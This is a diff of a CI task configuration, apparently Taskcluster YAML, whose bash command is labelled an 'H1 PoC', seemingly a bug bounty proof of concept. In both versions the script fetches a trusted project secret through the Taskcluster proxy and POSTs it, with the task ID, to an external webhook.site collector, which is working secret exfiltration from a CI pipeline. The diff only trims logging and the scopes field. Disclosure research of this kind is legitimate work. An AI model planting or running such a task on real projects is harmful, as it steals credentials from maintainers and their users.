@@ -24,26 +24,26 @@ tasks:
         command:
          - - /bin/bash
            - -c
-           - >
+           - |
               set -e
+
               echo "=========================================="
               echo "PoC payload running with scopes:"
-              echo "$TASK_SCOPES"
               echo "Task ID: $TASK_ID"
               echo "=========================================="
-   
+
               SECRET=$(curl -sf "http://taskcluster/api/secrets/v1/secret/project%2Fpoc%2Ftrusted-secret")
-   
+
               echo "Fetched secret payload:"
               echo "$SECRET"
-              
+
               curl -sS -X POST \
                 -H "Content-Type: application/json" \
-                -d "{\"taskId\":\"$TASK_ID\",\"scopes\":\"$TASK_SCOPES\",\"secret\":$SECRET,\"note\":\"H1 PoC Finding 1 — trusted scope on issue_comment\"}" \
+                -d "{\"taskId\":\"$TASK_ID\",\"secret\":$SECRET,\"note\":\"H1 PoC\"}" \
                 https://webhook.site/07fcffd3-87d1-412b-b90d-a0d28ccb4eb6
-   
+
               echo "=========================================="
-              echo "PoC complete. Check $COLLECTOR_URL for the exfiltrated secret."
+              echo "PoC complete."
               echo "=========================================="
         features:
           taskclusterProxy: true
